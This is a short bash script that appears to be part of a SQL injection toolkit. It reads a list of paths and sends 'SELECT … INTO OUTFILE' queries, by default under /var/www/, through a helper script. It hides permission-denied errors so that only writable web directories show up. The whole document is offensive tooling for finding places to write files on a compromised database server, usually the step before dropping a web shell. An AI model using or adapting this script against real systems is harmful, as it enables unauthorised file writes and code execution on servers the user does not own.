#!/usr/bin/env bash

DATA=fuzz
PREFIX="${3:-/var/www/}"

while read -r line
do
	echo "SELECT '$DATA' INTO OUTFILE '$PREFIX$line'"
done | ./query.sh "$1" "$2" | grep -v 'Errcode: 13'
